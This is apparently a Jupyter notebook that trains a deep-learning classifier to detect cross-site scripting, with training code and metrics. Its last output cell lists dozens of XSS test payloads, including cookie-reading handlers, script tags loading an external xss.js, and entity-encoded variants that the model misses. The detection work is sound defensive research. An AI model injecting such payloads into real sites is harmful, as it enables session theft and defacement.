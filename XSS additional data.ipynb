{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Paper:\n",
    "   #### Classification of Malicious Web Code Using Deep Learning [Manoj Kumar Selvam]\n",
    "### Dataset:\n",
    "    Total data 11516\n",
    "    XSS : 7121 + 853 = 7974\n",
    "    Benign : 3066 + 476 = 3542\n",
    "   \n",
    "   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 236,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[nltk_data] Downloading package punkt to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package punkt is already up-to-date!\n",
      "[nltk_data] Downloading package stopwords to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package stopwords is already up-to-date!\n",
      "[nltk_data] Downloading package wordnet to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package wordnet is already up-to-date!\n"
     ]
    }
   ],
   "source": [
    "import numpy as np\n",
    "import pandas as pd\n",
    "import glob\n",
    "import time\n",
    "import pandas as pd\n",
    "# from xml.dom import minidom\n",
    "\n",
    "import nltk\n",
    "nltk.download('punkt')\n",
    "nltk.download('stopwords')\n",
    "nltk.download('wordnet')\n",
    "from nltk.corpus import stopwords \n",
    "\n",
    "\n",
    "import os\n",
    "import matplotlib.pyplot as plt\n",
    "import keras"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 237,
   "metadata": {},
   "outputs": [],
   "source": [
    "import cv2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 238,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/portswigger.txt'\n",
    "\n",
    "XSS=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    XSS.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 239,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "7121"
      ]
     },
     "execution_count": 239,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(sqli_sentences)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 240,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Manually removed tag data\n",
    "\n",
    "\n",
    "path='./data/'\n",
    "file=\"scottparker_ml_sqli_src__trainingdata_plain.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 241,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.read_csv(os.path.join(path,file), sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 242,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Add plain text here</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Ne te quaesiveris extra.</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Man is his own star; and the soul that can</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Render an honest and a perfect man,</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Commands all light, all influence, all fate;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         benign\n",
       "0                           Add plain text here\n",
       "1                      Ne te quaesiveris extra.\n",
       "2    Man is his own star; and the soul that can\n",
       "3           Render an honest and a perfect man,\n",
       "4  Commands all light, all influence, all fate;"
      ]
     },
     "execution_count": 242,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 243,
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=df['benign'].values"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 244,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['Add plain text here', 'Ne te quaesiveris extra.',\n",
       "       'Man is his own star; and the soul that can',\n",
       "       'Render an honest and a perfect man,',\n",
       "       'Commands all light, all influence, all fate;'], dtype=object)"
      ]
     },
     "execution_count": 244,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "plain_text[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 245,
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=plain_text[:-22] # removed last 22 records that were urls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 246,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3641"
      ]
     },
     "execution_count": 246,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(plain_text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 247,
   "metadata": {},
   "outputs": [],
   "source": [
    "data=''\n",
    "for x in plain_text:\n",
    "    data+=\" \" + x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 248,
   "metadata": {},
   "outputs": [],
   "source": [
    "stop_words = set(stopwords.words('english')) \n",
    "def fun_remove_stop_words(posts):\n",
    "    filtered=''\n",
    "    for x in posts.split(' '):\n",
    "        if x not in stop_words:\n",
    "            filtered+=' '+x\n",
    "    return filtered"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 249,
   "metadata": {},
   "outputs": [],
   "source": [
    "data=fun_remove_stop_words(data)\n",
    "data=data.split('.')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 250,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['  Add plain text Ne te quaesiveris extra',\n",
       " ' Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late',\n",
       " ' Our acts angels are, good ill, Our fatal shadows walk us still',\n",
       " ' Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet',\n",
       " ' I read day verses written eminent painter original conventional']"
      ]
     },
     "execution_count": 250,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 251,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3066"
      ]
     },
     "execution_count": 251,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 252,
   "metadata": {},
   "outputs": [],
   "source": [
    "## Additional benign data \n",
    "\n",
    "path='./data/benign_for_training.txt'\n",
    "benign_data=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    benign_data.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 253,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/xss_for_training.txt'\n",
    "xss_data=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    xss_data.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 254,
   "metadata": {},
   "outputs": [],
   "source": [
    "values=[]\n",
    "for i in XSS:\n",
    "    values.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 255,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "for i in data:\n",
    "    values.append((i,0))\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 256,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in benign_data:\n",
    "    values.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 257,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in xss_data:\n",
    "    values.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 258,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "476"
      ]
     },
     "execution_count": 258,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(benign_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 259,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "853"
      ]
     },
     "execution_count": 259,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(xss_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 260,
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.DataFrame(values,columns=['Sentence','Label'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 261,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.to_csv('XSS_dataset.csv', encoding='utf-8-sig')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 262,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "11516"
      ]
     },
     "execution_count": 262,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 265,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('<a draggable=\"true\" ondragend=\"alert(1)\">test</a>\\n', 1)"
      ]
     },
     "execution_count": 265,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "values[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 266,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(' <a onclick=\"alert(1)\">test</a>\\n', 1)"
      ]
     },
     "execution_count": 266,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "values[-1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 267,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<a draggable=\"true\" ondragend=\"alert(1)\">test</a>\\n'"
      ]
     },
     "execution_count": 267,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sentences=df['Sentence'].values\n",
    "sentences[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 268,
   "metadata": {},
   "outputs": [],
   "source": [
    "def convert_to_ascii(sentence):\n",
    "    sentence_ascii=[]\n",
    "\n",
    "    for i in sentence:\n",
    "        sentence_ascii.append(ord(i))\n",
    "\n",
    "    zer=np.zeros((10000))\n",
    "\n",
    "    for i in range(len(sentence_ascii)):\n",
    "        zer[i]=sentence_ascii[i]\n",
    "\n",
    "    zer.shape=(100, 100)\n",
    "\n",
    "\n",
    "#     plt.plot(image)\n",
    "#     plt.show()\n",
    "    return zer\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 270,
   "metadata": {},
   "outputs": [],
   "source": [
    "# display_ascii(sentences[100])\n",
    "\n",
    "\n",
    "arr=np.zeros((11516,100,100))\n",
    "\n",
    "for i in range(len(sentences)):\n",
    "    \n",
    "    image=convert_to_ascii(sentences[i])\n",
    "\n",
    "    x=np.asarray(image,dtype='float')\n",
    "    image =  cv2.resize(x, dsize=(100,100), interpolation=cv2.INTER_CUBIC)\n",
    "    image/=128\n",
    "    \n",
    "#     if i==1:\n",
    "#         plt.plot(image)\n",
    "#         plt.show()    \n",
    "    arr[i]=image"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 271,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(11516, 100, 100)"
      ]
     },
     "execution_count": 271,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "arr.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 272,
   "metadata": {},
   "outputs": [],
   "source": [
    "data = arr.reshape(arr.shape[0], 100, 100, 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 273,
   "metadata": {},
   "outputs": [],
   "source": [
    "y=df['Label'].values"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 274,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.model_selection import train_test_split\n",
    "trainX, testX, trainY, testY = train_test_split(data,y, test_size=0.2, random_state=42)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 275,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "from keras.models import Sequential\n",
    "from keras.layers import Dense, Activation, Conv2D, MaxPooling2D,Flatten,Dropout,MaxPool2D, BatchNormalization\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 302,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "model = Sequential()\n",
    "model.add(keras.layers.Flatten(input_shape=(100,100,1)))\n",
    "\n",
    "model.add(keras.layers.Dense(1024, activation='relu'))\n",
    "model.add(keras.layers.Dense(512, activation='relu'))\n",
    "\n",
    "model.add(keras.layers.Dense(256, activation='relu'))\n",
    "\n",
    "model.add(keras.layers.Dense(128, activation='relu'))\n",
    "\n",
    "# model.add(keras.layers.Dense(20,  activation='relu'))\n",
    "# model.add(keras.layers.Dense(10,  activation='tanh'))\n",
    "# # model.add(layers.Flatten())\n",
    "# model.add(keras.layers.Dense(1024, activation='relu'))\n",
    "\n",
    "model.add(keras.layers.BatchNormalization())\n",
    "model.add(keras.layers.Dropout(0.5))\n",
    "model.add(keras.layers.Dense(1, activation='sigmoid'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 303,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"sequential_5\"\n",
      "_________________________________________________________________\n",
      "Layer (type)                 Output Shape              Param #   \n",
      "=================================================================\n",
      "flatten_5 (Flatten)          (None, 10000)             0         \n",
      "_________________________________________________________________\n",
      "dense_17 (Dense)             (None, 1024)              10241024  \n",
      "_________________________________________________________________\n",
      "dense_18 (Dense)             (None, 512)               524800    \n",
      "_________________________________________________________________\n",
      "dense_19 (Dense)             (None, 256)               131328    \n",
      "_________________________________________________________________\n",
      "dense_20 (Dense)             (None, 128)               32896     \n",
      "_________________________________________________________________\n",
      "batch_normalization_5 (Batch (None, 128)               512       \n",
      "_________________________________________________________________\n",
      "dropout_5 (Dropout)          (None, 128)               0         \n",
      "_________________________________________________________________\n",
      "dense_21 (Dense)             (None, 1)                 129       \n",
      "=================================================================\n",
      "Total params: 10,930,689\n",
      "Trainable params: 10,930,433\n",
      "Non-trainable params: 256\n",
      "_________________________________________________________________\n"
     ]
    }
   ],
   "source": [
    "\n",
    "\n",
    "model.compile(loss='binary_crossentropy', \n",
    "              optimizer='adam', \n",
    "              metrics=['accuracy'])\n",
    "model.summary()\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 304,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tensorflow as tf\n",
    "\n",
    "class myCallback(tf.keras.callbacks.Callback):\n",
    "    def on_epoch_end(self, epoch, logs={}):\n",
    "        if(logs.get('val_accuracy')>0.95):\n",
    "            print(\" \\n Reached 95% + validation accuracy\")\n",
    "            self.model.stop_training=True\n",
    "callbacks = myCallback()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 305,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Train on 9212 samples, validate on 2304 samples\n",
      "Epoch 1/10\n",
      "9212/9212 [==============================] - 20s 2ms/step - loss: 0.4386 - accuracy: 0.8174 - val_loss: 0.4011 - val_accuracy: 0.7695\n",
      "{'val_loss': 0.4010540975464715, 'val_accuracy': 0.76953125, 'loss': 0.43856646228602697, 'accuracy': 0.8174121}\n",
      "Epoch 2/10\n",
      "9212/9212 [==============================] - 19s 2ms/step - loss: 0.1776 - accuracy: 0.9456 - val_loss: 0.3637 - val_accuracy: 0.8364\n",
      "{'val_loss': 0.36373494731055367, 'val_accuracy': 0.8363715410232544, 'loss': 0.1776137318602863, 'accuracy': 0.9456144}\n",
      "Epoch 3/10\n",
      "9212/9212 [==============================] - 19s 2ms/step - loss: 0.1345 - accuracy: 0.9570 - val_loss: 0.2050 - val_accuracy: 0.9336\n",
      "{'val_loss': 0.20498267312844595, 'val_accuracy': 0.93359375, 'loss': 0.1344909484535003, 'accuracy': 0.9570126}\n",
      "Epoch 4/10\n",
      "9212/9212 [==============================] - 19s 2ms/step - loss: 0.1061 - accuracy: 0.9701 - val_loss: 0.2233 - val_accuracy: 0.8980\n",
      "{'val_loss': 0.22327076560921139, 'val_accuracy': 0.8980034589767456, 'loss': 0.10608522400512314, 'accuracy': 0.9701476}\n",
      "Epoch 5/10\n",
      "9212/9212 [==============================] - 19s 2ms/step - loss: 0.0987 - accuracy: 0.9712 - val_loss: 0.1362 - val_accuracy: 0.9740\n",
      "{'val_loss': 0.13615891502963173, 'val_accuracy': 0.9739583134651184, 'loss': 0.09869449522266997, 'accuracy': 0.9712332}\n",
      " \n",
      " Reached 95% + validation accuracy\n"
     ]
    }
   ],
   "source": [
    "batch_size = 128\n",
    "num_epoch = 10\n",
    "#model training\n",
    "model_log = model.fit(trainX, trainY,\n",
    "          batch_size=batch_size,\n",
    "          epochs=num_epoch,\n",
    "          verbose=1,\n",
    "          validation_data=( testX,  testY),\n",
    "                      callbacks=[callbacks])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 306,
   "metadata": {},
   "outputs": [],
   "source": [
    "pred=model.predict(testX)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 307,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(pred)):\n",
    "    if pred[i]>0.5:\n",
    "        pred[i]=1\n",
    "    elif pred[i]<=0.5:\n",
    "        pred[i]=0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 308,
   "metadata": {},
   "outputs": [],
   "source": [
    "true=0\n",
    "false=0\n",
    "\n",
    "for i in range(len(pred)):\n",
    "    if pred[i] == testY[i]:\n",
    "        true+=1\n",
    "    else:\n",
    "        false+=1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 309,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "correct predicted ::  2244\n"
     ]
    }
   ],
   "source": [
    "print(\"correct predicted :: \", true)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 310,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "false prediction ::  60\n"
     ]
    }
   ],
   "source": [
    "print(\"false prediction :: \", false)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 311,
   "metadata": {},
   "outputs": [],
   "source": [
    "attack=0\n",
    "benign=0\n",
    "for i in range(len(testY)):\n",
    "    if testY[i]==1:\n",
    "        attack+=1\n",
    "    else:\n",
    "        benign+=1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 312,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attack data in test set ::  1625\n"
     ]
    }
   ],
   "source": [
    "print(\"Attack data in test set :: \", attack)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 313,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Benign data in test set ::  679\n"
     ]
    }
   ],
   "source": [
    "print(\" Benign data in test set :: \", benign)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Confusion Matrix"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 314,
   "metadata": {},
   "outputs": [],
   "source": [
    "def accuracy_function(tp,tn,fp,fn):\n",
    "    \n",
    "    accuracy = (tp+tn) / (tp+tn+fp+fn)\n",
    "    \n",
    "    return accuracy\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 315,
   "metadata": {},
   "outputs": [],
   "source": [
    "def precision_function(tp,fp):\n",
    "    \n",
    "    precision = tp / (tp+fp)\n",
    "    \n",
    "    return precision\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 316,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "def recall_function(tp,fn):\n",
    "    \n",
    "    recall=tp / (tp+fn)\n",
    "    \n",
    "    return recall\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 317,
   "metadata": {},
   "outputs": [],
   "source": [
    "def confusion_matrix(truth,predicted):\n",
    "    \n",
    "    true_positive = 0\n",
    "    true_negative = 0\n",
    "    false_positive = 0\n",
    "    false_negative = 0\n",
    "    \n",
    "    for true,pred in zip(truth,predicted):\n",
    "        if true == 1:\n",
    "            if pred == true:\n",
    "                true_positive += 1\n",
    "            elif pred != true:\n",
    "                false_negative += 1\n",
    "\n",
    "        elif true == 0:\n",
    "            if pred == true:\n",
    "                true_negative += 1\n",
    "            elif pred != true:\n",
    "                false_positive += 1\n",
    "            \n",
    "    accuracy=accuracy_function(true_positive, true_negative, false_positive, false_negative)\n",
    "    precision=precision_function(true_positive, false_positive)\n",
    "    recall=recall_function(true_positive, false_negative)\n",
    "    \n",
    "    return (accuracy,\n",
    "            precision,\n",
    "           recall)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 318,
   "metadata": {},
   "outputs": [],
   "source": [
    "accuracy,precision,recall=confusion_matrix(testY,pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 319,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Accuracy : 0.9739583333333334 \n",
      " Precision : 0.9809465273509527 \n",
      " Recall : 0.9821538461538462\n"
     ]
    }
   ],
   "source": [
    "print(\" Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 320,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9809465273509527"
      ]
     },
     "execution_count": 320,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from sklearn.metrics import precision_score\n",
    "precision_score(testY, pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 321,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9821538461538462"
      ]
     },
     "execution_count": 321,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from sklearn.metrics import recall_score\n",
    "recall_score(testY, pred)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 232,
   "metadata": {},
   "outputs": [],
   "source": [
    "def predict_cross_site_script():\n",
    "    \n",
    "    repeat=True\n",
    "    \n",
    "    \n",
    "    \n",
    "    \n",
    "    beautify=''\n",
    "    for i in range(20):\n",
    "        beautify+= \"=\"\n",
    "\n",
    "    print(beautify) \n",
    "    input_val=input(\"Give me some data to work on : \")\n",
    "    print(beautify)\n",
    "    \n",
    "    if input_val== '0':\n",
    "        repeat=False\n",
    "        \n",
    "        \n",
    "    \n",
    "    if repeat == True:\n",
    "\n",
    "        sentence_ascii=[]\n",
    "\n",
    "        for i in input_val:\n",
    "            sentence_ascii.append(ord(i))\n",
    "\n",
    "        storage=np.zeros((10000))\n",
    "\n",
    "        for i in range(len(sentence_ascii)):\n",
    "            storage[i]=sentence_ascii[i]\n",
    "\n",
    "        storage.shape=(100, 100)\n",
    "\n",
    "        x=np.asarray(storage,dtype='float')\n",
    "        image =  cv2.resize(x, dsize=(100,100), interpolation=cv2.INTER_CUBIC)\n",
    "        image.shape=(1,100,100,1)\n",
    "        image/=128\n",
    "\n",
    "        prediction=model.predict(image)\n",
    "\n",
    "        if prediction>0.5:\n",
    "\n",
    "    #         print(f\"Chances of attack :  {prediction[0]*100} \")\n",
    "            print(\" It can be Cross site scripting attack\")\n",
    "\n",
    "        else:\n",
    "\n",
    "    #         print(f\" Chances of being safe {100 - (prediction*100) }\")\n",
    "            print(\"seems safe\")\n",
    "        \n",
    "        \n",
    "        predict_cross_site_script()\n",
    "        \n",
    "        \n",
    "    elif repeat == False:\n",
    "        print( \" Good Bye \")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 235,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "====================\n",
      "Give me some data to work on : \n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\"javascript:alert('XSS');\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=javascript:alert('XSS')>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=JaVaScRiPt:alert('XSS')>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=javascript:alert(&quot;XSS&quot;)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : \\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : \\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=# onmouseover=\"alert('xxs')\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC= onmouseover=\"alert('xxs')\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG onmouseover=\"alert('xxs')\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\"jav\tascript:alert('XSS');\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\"jav&#x09;ascript:alert('XSS');\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' >\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\" &#14;  javascript:alert('XSS');\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
